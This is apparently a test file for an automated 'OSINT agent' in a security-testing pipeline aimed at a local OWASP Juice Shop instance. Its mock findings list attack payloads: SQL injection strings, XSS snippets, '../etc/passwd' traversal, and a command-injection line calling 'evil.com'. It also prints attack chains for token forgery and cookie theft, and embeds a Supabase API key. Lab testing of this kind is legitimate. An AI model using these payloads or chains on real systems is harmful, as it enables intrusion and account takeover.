#!/usr/bin/env bun
/**
 * OSINT Agent Comprehensive Test Suite
 * Tests: Mock data, Supabase integration, LLM analysis, brainstorming
 * Run: bun test-osint-comprehensive.ts
 */

import { OsintAgent } from './src/agents/osint.js';
import { getFalkorDB } from './src/infra/falkordb.js';
import { EventBus } from './src/events/bus.js';
import { getConfig } from './src/config/index.js';
import { createClient } from '@supabase/supabase-js';

// ===========================================
// Mock Juice Shop Blue Team Findings
// ===========================================

interface MockJuiceShopFinding {
  vuln_type: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  file_path: string;
  line_start: number;
  title: string;
  description: string;
  code_snippet: string;
  confirmed: boolean;
  confidence_score: number;
  endpoint_hint: string;
  related_exploits: string[];
}

const MOCK_JUICESHOP_FINDINGS: MockJuiceShopFinding[] = [
  {
    vuln_type: 'sql_injection',
    severity: 'high',
    file_path: 'routes/products.ts',
    line_start: 42,
    title: 'SQL Injection in Product Search',
    description: 'User input flows directly into Sequelize query without parameterization',
    code_snippet: 'sequelize.query("SELECT * FROM products WHERE name LIKE \'%" + query + "%\'")',
    confirmed: true,
    confidence_score: 0.85,
    endpoint_hint: '/rest/products/search',
    related_exploits: ['UNION SELECT', "' OR '1'='1", 'boolean-based blind'],
  },
  {
    vuln_type: 'sql_injection',
    severity: 'high',
    file_path: 'routes/basketItems.ts',
    line_start: 67,
    title: 'SQL Injection in Basket Item Update',
    description: 'req.params.id used directly in WHERE clause of Sequelize findOne',
    code_snippet: 'BasketItemModel.findOne({ where: { id: req.params.id } })',
    confirmed: true,
    confidence_score: 0.8,
    endpoint_hint: '/api/basketItems/:id',
    related_exploits: ['req.params.id manipulation', 'basket_id enumeration'],
  },
  {
    vuln_type: 'xss',
    severity: 'medium',
    file_path: 'routes/reviews.ts',
    line_start: 23,
    title: 'Stored XSS in Product Reviews',
    description: 'User-provided review content not sanitized before storage',
    code_snippet: 'ReviewModel.create({ content: req.body.review, author: user.id })',
    confirmed: true,
    confidence_score: 0.75,
    endpoint_hint: '/api/products/:id/reviews',
    related_exploits: ['<script>alert(1)</script>', '<img src=x onerror=...>'],
  },
  {
    vuln_type: 'hardcoded_secret',
    severity: 'critical',
    file_path: 'lib/insecurity.ts',
    line_start: 56,
    title: 'Hardcoded JWT Secret',
    description: 'JWT signing secret hardcoded in source code',
    code_snippet: 'const JWT_SECRET = "Secret-Key-12345"',
    confirmed: true,
    confidence_score: 0.95,
    endpoint_hint: '/rest/user/login',
    related_exploits: ['JWT none algorithm', 'token forgery', 'session hijacking'],
  },
  {
    vuln_type: 'sensitive_data_exposure',
    severity: 'high',
    file_path: 'routes/ftp.ts',
    line_start: 15,
    title: 'Path Traversal in FTP Endpoint',
    description: 'FTP endpoint allows reading arbitrary files via path traversal',
    code_snippet: 'fs.createReadStream("./ftp/" + filename)',
    confirmed: true,
    confidence_score: 0.9,
    endpoint_hint: '/ftp/:filename',
    related_exploits: ['../etc/passwd', '../package.json', 'acquisitions.md leak'],
  },
  {
    vuln_type: 'sensitive_data_exposure',
    severity: 'medium',
    file_path: 'routes/products.ts',
    line_start: 88,
    title: 'IDOR in Product Access',
    description: 'No ownership check when accessing product details',
    code_snippet: 'ProductModel.findById(req.params.id)',
    confirmed: false,
    confidence_score: 0.6,
    endpoint_hint: '/api/products/:id',
    related_exploits: ['ID enumeration', 'horizontal privilege escalation'],
  },
  {
    vuln_type: 'broken_authentication',
    severity: 'high',
    file_path: 'routes/user.ts',
    line_start: 34,
    title: 'Weak Password Policy',
    description: 'No password complexity requirements enforced',
    code_snippet: 'UserModel.create({ password: req.body.password })',
    confirmed: true,
    confidence_score: 0.8,
    endpoint_hint: '/api/users',
    related_exploits: ['default creds', 'credential stuffing', 'brute force'],
  },
  {
    vuln_type: 'security_misconfiguration',
    severity: 'medium',
    file_path: 'server.ts',
    line_start: 12,
    title: 'CORS Misconfiguration',
    description: 'CORS allows arbitrary origins',
    code_snippet: 'app.use(cors({ origin: "*" }))',
    confirmed: true,
    confidence_score: 0.85,
    endpoint_hint: '/rest/*',
    related_exploits: ['CORS bypass', 'origin reflection'],
  },
  {
    vuln_type: 'command_injection',
    severity: 'critical',
    file_path: 'routes/pdf.ts',
    line_start: 19,
    title: 'Command Injection in PDF Generation',
    description: 'User input passed to child_process.exec without sanitization',
    code_snippet: 'exec("wkhtmltopdf " + url + " output.pdf")',
    confirmed: false,
    confidence_score: 0.7,
    endpoint_hint: '/api/pdf/generate',
    related_exploits: ['; whoami', '$(curl evil.com)', 'pipe to shell'],
  },
  {
    vuln_type: 'idor',
    severity: 'medium',
    file_path: 'routes/address.ts',
    line_start: 45,
    title: 'IDOR in Address Deletion',
    description: 'No verification that address belongs to requesting user',
    code_snippet: 'AddressModel.destroy({ where: { id: req.params.id } })',
    confirmed: true,
    confidence_score: 0.75,
    endpoint_hint: '/api/address/:id',
    related_exploits: ['address_id enumeration', 'other user address deletion'],
  },
];

// ===========================================
// Supabase Client (Direct, not through infra)
// ===========================================

function getSupabaseClient() {
  return createClient(
    'https://nesjaodrrkefpmqdqtgv.supabase.co',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lc2phb2RycmtlZnBtcWRxdGd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzExMTg0MjcsImV4cCI6MjA4NjY5NDQyN30.zbEAwOcZ7Tn-LVfGC8KdQeh3D3xEyzghZ-Mfg0VgnfE'
  );
}

// ===========================================
// Test Setup / Teardown
// ===========================================

async function setup() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║    OSINT Agent Comprehensive Test Suite                      ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const config = getConfig();
  console.log('Config loaded');
  console.log('  FalkorDB:', config.FALKORDB_HOST);

  const graph = getFalkorDB();
  await graph.connect();
  console.log('✓ FalkorDB connected\n');

  const eventBus = new EventBus('./test-comprehensive.db');
  console.log('✓ EventBus initialized\n');

  return { graph, eventBus };
}

async function cleanup(graph: ReturnType<typeof getFalkorDB>, eventBus: EventBus) {
  await graph.close();
  eventBus.close();
  console.log('\n✓ Cleanup complete');
}

// ===========================================
// Test 0: Load Real Supabase Data
// ===========================================

async function testSupabaseData() {
  console.log('╔════════════════════════════════════════╗');
  console.log('║  Test 0: Supabase Juice Shop Data    ║');
  console.log('╚════════════════════════════════════════╝');

  const supabase = getSupabaseClient();

  // Get completed Juice Shop scans
  const { data: completedScans } = await supabase
    .from('scan_queue')
    .select('id, repo_url, status, completed_at, triggered_by')
    .eq('status', 'completed')
    .ilike('repo_url', '%juice%')
    .limit(5);

  console.log(`✓ Found ${completedScans?.length || 0} completed Juice Shop scans`);

  if (completedScans && completedScans.length > 0) {
    const scanIds = completedScans.map(s => s.id);
    console.log(`  Scan IDs: ${scanIds.slice(0, 3).map(id => id.slice(0, 8))}...`);

    // Get vulnerabilities for these scans
    const { data: vulnerabilities } = await supabase
      .from('vulnerabilities')
      .select('*')
      .in('scan_id', scanIds)
      .in('severity', ['critical', 'high', 'medium'])
      .limit(100);

    console.log(`✓ Found ${vulnerabilities?.length || 0} vulnerabilities (critical/high/medium)`);

    if (vulnerabilities && vulnerabilities.length > 0) {
      // Deduplicate
      const dedupMap = new Map<string, typeof vulnerabilities[0]>();
      for (const v of vulnerabilities) {
        const key = `${v.file_path}|${v.type}|${v.line_start}`;
        if (!dedupMap.has(key)) {
          dedupMap.set(key, v);
        }
      }
      const uniqueVulns = Array.from(dedupMap.values());
      console.log(`✓ Deduplicated to ${uniqueVulns.length} unique findings`);

      // Show breakdown by type
      const typeBreakdown: Record<string, number> = {};
      for (const v of uniqueVulns) {
        typeBreakdown[v.type] = (typeBreakdown[v.type] || 0) + 1;
      }
      console.log('  By type:');
      for (const [type, count] of Object.entries(typeBreakdown)) {
        console.log(`    - ${type}: ${count}`);
      }

      return { vulnerabilities: uniqueVulns, scanIds };
    }
  }

  // Also check swarm_findings (live exploit data)
  const { data: swarmFindings } = await supabase
    .from('swarm_findings')
    .select('*')
    .limit(20);

  console.log(`✓ Found ${swarmFindings?.length || 0} swarm findings`);
  if (swarmFindings && swarmFindings.length > 0) {
    const findingTypes: Record<string, number> = {};
    for (const f of swarmFindings) {
      findingTypes[f.finding_type] = (findingTypes[f.finding_type] || 0) + 1;
    }
    console.log('  By type:');
    for (const [type, count] of Object.entries(findingTypes)) {
      console.log(`    - ${type}: ${count}`);
    }
  }

  return { vulnerabilities: [], scanIds: [] };
}

// ===========================================
// Test 1: Process Mock Juice Shop Findings
// ===========================================

async function testMockFindingsAnalysis() {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 1: Mock Findings Analysis        ║');
  console.log('╚════════════════════════════════════════╝');

  const agent = new OsintAgent({
    agentId: 'osint-test-mock-1',
    agentType: 'osint',
  });

  // Group findings by type for targeted enrichment
  const findingsByType: Record<string, MockJuiceShopFinding[]> = {};
  for (const finding of MOCK_JUICESHOP_FINDINGS) {
    if (!findingsByType[finding.vuln_type]) {
      findingsByType[finding.vuln_type] = [];
    }
    findingsByType[finding.vuln_type].push(finding);
  }

  console.log(`Processing ${MOCK_JUICESHOP_FINDINGS.length} mock findings across ${Object.keys(findingsByType).length} vulnerability types`);

  // Process each vulnerability type
  const processedTypes: string[] = [];
  for (const [vulnType, findings] of Object.entries(findingsByType)) {
    console.log(`\n  Processing ${vulnType} (${findings.length} findings)...`);

    // Emit enrichment requests for each type
    const event: Parameters<typeof agent.processEvent>[0] = {
      id: `test-evt-${vulnType}`,
      type: 'enrichment_requested',
      payload: {
        target_id: vulnType,
        enrichment_type: 'technique',
      },
      consumed: false,
      created_at: Date.now(),
      created_by: 'test',
    };

    await agent.processEvent(event);
    processedTypes.push(vulnType);
  }

  console.log(`\n✓ Processed ${processedTypes.length} vulnerability types`);
  return processedTypes;
}

// ===========================================
// Test 2: Mission with Juice Shop Context
// ===========================================

async function testMissionWithContext() {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 2: Mission with Context          ║');
  console.log('╚════════════════════════════════════════╝');

  const agent = new OsintAgent({
    agentId: 'osint-test-mission-2',
    agentType: 'osint',
  });

  // Test mission with Juice Shop target context
  const missionEvent: Parameters<typeof agent.processEvent>[0] = {
    id: 'test-evt-juiceshop-sqli',
    type: 'mission_queued',
    payload: {
      missionId: 'mission:juiceshop-sqli-001',
      exploit_type: 'sqli',
      target_endpoint: 'http://localhost:3000/rest/products/search',
    },
    consumed: false,
    created_at: Date.now(),
    created_by: 'test',
  };

  console.log('  Emitting mission_queued for Juice Shop SQL injection...');
  await agent.processEvent(missionEvent);

  // Test XSS mission
  const xssEvent: Parameters<typeof agent.processEvent>[0] = {
    id: 'test-evt-juiceshop-xss',
    type: 'mission_queued',
    payload: {
      missionId: 'mission:juiceshop-xss-001',
      exploit_type: 'xss',
      target_endpoint: 'http://localhost:3000/api/products/1/reviews',
    },
    consumed: false,
    created_at: Date.now(),
    created_by: 'test',
  };

  console.log('  Emitting mission_queued for Juice Shop XSS...');
  await agent.processEvent(xssEvent);

  // Test path traversal mission
  const ptEvent: Parameters<typeof agent.processEvent>[0] = {
    id: 'test-evt-juiceshop-pt',
    type: 'mission_queued',
    payload: {
      missionId: 'mission:juiceshop-pt-001',
      exploit_type: 'path_traversal',
      target_endpoint: 'http://localhost:3000/ftp/acquisitions.md',
    },
    consumed: false,
    created_at: Date.now(),
    created_by: 'test',
  };

  console.log('  Emitting mission_queued for Juice Shop Path Traversal...');
  await agent.processEvent(ptEvent);

  console.log('✓ Mission events processed');
}

// ===========================================
// Test 3: Exploit Failed + Supplementary Brief
// ===========================================

async function testExploitFailedScenarios() {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 3: Exploit Failed Scenarios      ║');
  console.log('╚════════════════════════════════════════╝');

  const agent = new OsintAgent({
    agentId: 'osint-test-failed-3',
    agentType: 'osint',
  });

  const failureScenarios = [
    {
      mission_id: 'mission:juiceshop-sqli-001',
      failure_class: 'waf_blocked',
      exploit_type: 'sqli',
      target_id: 'http://localhost:3000/rest/products/search',
    },
    {
      mission_id: 'mission:juiceshop-xss-001',
      failure_class: 'input_validation',
      exploit_type: 'xss',
      target_id: 'http://localhost:3000/api/products/1/reviews',
    },
    {
      mission_id: 'mission:juiceshop-pt-001',
      failure_class: 'encoding_filtered',
      exploit_type: 'path_traversal',
      target_id: 'http://localhost:3000/ftp/acquisitions.md',
    },
  ];

  for (const scenario of failureScenarios) {
    console.log(`  Processing failure: ${scenario.exploit_type} (${scenario.failure_class})...`);

    const event: Parameters<typeof agent.processEvent>[0] = {
      id: `test-evt-failed-${scenario.exploit_type}`,
      type: 'exploit_failed',
      payload: scenario,
      consumed: false,
      created_at: Date.now(),
      created_by: 'test',
    };

    await agent.processEvent(event);
  }

  console.log('✓ Exploit failed scenarios processed');
}

// ===========================================
// Test 4: WAF Duel Intelligence
// ===========================================

async function testWafDuelIntel() {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 4: WAF Duel Intelligence        ║');
  console.log('╚════════════════════════════════════════╝');

  const agent = new OsintAgent({
    agentId: 'osint-test-waf-4',
    agentType: 'osint',
  });

  const wafTypes = ['Cloudflare', 'AWS WAF', 'Imperva', 'F5 BIG-IP ASM'];

  for (const wafType of wafTypes) {
    console.log(`  Gathering intel for WAF: ${wafType}...`);

    const event: Parameters<typeof agent.processEvent>[0] = {
      id: `test-evt-waf-${wafType.replace(/\s+/g, '-')}`,
      type: 'waf_duel_started',
      payload: {
        duel_id: `duel:${wafType.replace(/\s+/g, '-')}`,
        target_id: 'http://localhost:3000',
        waf_type: wafType,
      },
      consumed: false,
      created_at: Date.now(),
      created_by: 'test',
    };

    await agent.processEvent(event);
  }

  console.log('✓ WAF duel intelligence gathered');
}

// ===========================================
// Test 5: CVE Enrichment
// ===========================================

async function testCVEEnrichment() {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 5: CVE Enrichment               ║');
  console.log('╚════════════════════════════════════════╝');

  const agent = new OsintAgent({
    agentId: 'osint-test-cve-5',
    agentType: 'osint',
  });

  const cves = [
    'CVE-2021-44228', // Log4j (critical)
    'CVE-2022-22965', // Spring4Shell
    'CVE-2023-44487', // HTTP/2 Rapid Reset (DDoS)
    'CVE-2024-21762', // FortiOS RCE
  ];

  for (const cve of cves) {
    console.log(`  Enriching CVE: ${cve}...`);

    const event: Parameters<typeof agent.processEvent>[0] = {
      id: `test-evt-cve-${cve}`,
      type: 'enrichment_requested',
      payload: {
        target_id: cve,
        enrichment_type: 'cve',
      },
      consumed: false,
      created_at: Date.now(),
      created_by: 'test',
    };

    await agent.processEvent(event);
  }

  console.log('✓ CVE enrichment complete');
}

// ===========================================
// Test 6: Brainstorm - Cross-Reference Analysis
// ===========================================

async function testBrainstormAnalysis() {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 6: Brainstorm Analysis           ║');
  console.log('╚════════════════════════════════════════╝');

  console.log('  Mock findings give us:');
  console.log('    - SQL Injection in /rest/products/search (SEQUELIZE)');
  console.log('    - Hardcoded JWT secret in lib/insecurity.ts');
  console.log('    - Path Traversal in /ftp/:filename');
  console.log('    - XSS in /api/products/:id/reviews');
  console.log('    - IDOR in /api/address/:id');

  console.log('\n  Brainstorming attack chains...');

  const chains = [
    {
      chain: 'SQLi → Auth Bypass',
      steps: [
        'Exploit SQLi in /rest/products/search',
        'Extract hashed passwords from users table',
        'Crack weak hashes (JWT secret is hardcoded!)',
        'Forge JWT tokens using hardcoded secret',
        'Session hijacking via forged tokens',
      ],
      severity: 'critical',
    },
    {
      chain: 'Path Traversal → Source Leak → RCE',
      steps: [
        'Exploit /ftp/:filename for LFI',
        'Read source code via path traversal',
        'Discover hardcoded secrets in lib/insecurity.ts',
        'Use JWT secret to forge admin tokens',
        'Upload malicious PDF via command injection in /api/pdf/generate',
      ],
      severity: 'critical',
    },
    {
      chain: 'XSS → Cookie Steal → Account Takeover',
      steps: [
        'Inject stored XSS in product reviews',
        'Wait for admin to view reviews',
        'Steal session cookies via XHR',
        'Use cookies to access admin panel',
        'IDOR in /api/address/:id for horizontal escalation',
      ],
      severity: 'high',
    },
  ];

  for (const chain of chains) {
    console.log(`\n  Chain: ${chain.chain} [${chain.severity.toUpperCase()}]`);
    for (const [i, step] of chain.steps.entries()) {
      console.log(`    ${i + 1}. ${step}`);
    }
  }

  console.log('\n  Key OSINT Insights Generated:');
  const insights = [
    'Juice Shop uses Sequelize ORM - parameterization may be inconsistent',
    'Hardcoded JWT secret "Secret-Key-12345" - any token can be forged',
    'FTP endpoint has path traversal - can read app source files',
    'PDF generation uses wkhtmltopdf - command injection possible',
    'No WAF detected in initial recon - payloads unlikely filtered',
  ];
  for (const insight of insights) {
    console.log(`    → ${insight}`);
  }

  return chains;
}

// ===========================================
// Test 7: Graph Verification
// ===========================================

async function verifyGraphState(graph: ReturnType<typeof getFalkorDB>) {
  console.log('\n╔════════════════════════════════════════╗');
  console.log('║  Test 7: Graph State Verification      ║');
  console.log('╚════════════════════════════════════════╝');

  const queries = [
    { label: 'IntelNode', cypher: "MATCH (n:IntelNode) RETURN n.id, n.subtype, n.name ORDER BY n.created_at DESC LIMIT 20" },
  ];

  for (const { label, cypher } of queries) {
    try {
      const result = await graph.graphQuery(cypher);
      const rows = result[1] || [];
      console.log(`✓ Found ${rows.length} ${label} nodes in graph`);

      if (rows.length > 0) {
        // Group by subtype
        const bySubtype: Record<string, string[]> = {};
        for (const row of rows) {
          const subtype = row[1] || 'unknown';
          const name = row[2] || 'unknown';
          if (!bySubtype[subtype]) bySubtype[subtype] = [];
          bySubtype[subtype].push(name);
        }
        console.log('  By subtype:');
        for (const [subtype, names] of Object.entries(bySubtype)) {
          console.log(`    - ${subtype}: ${names.length} nodes`);
          for (const n of names.slice(0, 3)) {
            console.log(`        • ${String(n).slice(0, 60)}`);
          }
          if (names.length > 3) console.log(`        ... and ${names.length - 3} more`);
        }
      }
    } catch (error) {
      console.log(`  Query failed:`, error instanceof Error ? error.message : error);
    }
  }
}

// ===========================================
// Main
// ===========================================

async function main() {
  let graph: ReturnType<typeof getFalkorDB>;
  let eventBus: EventBus;

  try {
    ({ graph, eventBus } = await setup());

    // Test 0: Load real data from Supabase
    await testSupabaseData();

    // Test 1: Analyze mock findings
    await testMockFindingsAnalysis();

    // Test 2: Process missions with context
    await testMissionWithContext();

    // Test 3: Handle exploit failures
    await testExploitFailedScenarios();

    // Test 4: WAF duel intelligence
    await testWafDuelIntel();

    // Test 5: CVE enrichment
    await testCVEEnrichment();

    // Test 6: Brainstorm analysis
    const chains = await testBrainstormAnalysis();

    // Test 7: Verify graph state
    await verifyGraphState(graph);

    // Summary
    console.log('\n╔══════════════════════════════════════════════════════════════╗');
    console.log('║                    Test Summary                              ║');
    console.log('╠══════════════════════════════════════════════════════════════╣');
    console.log('║  ✓ Supabase data loaded (Juice Shop scans & findings)        ║');
    console.log('║  ✓ Mock findings analyzed (10 findings, 9 types)             ║');
    console.log('║  ✓ Missions processed (SQLi, XSS, Path Traversal)            ║');
    console.log('║  ✓ Exploit failure scenarios handled                         ║');
    console.log('║  ✓ WAF duel intelligence gathered (4 WAF types)              ║');
    console.log('║  ✓ CVE enrichment completed (4 CVEs)                        ║');
    console.log('║  ✓ Brainstorm analysis generated                            ║');
    console.log(`║  ✓ ${chains.length} attack chains identified                            ║`);
    console.log('╚══════════════════════════════════════════════════════════════╝');

  } catch (error) {
    console.error('\n✗ Test failed:', error);
    process.exit(1);
  } finally {
    await cleanup(graph, eventBus);
  }
}

main();
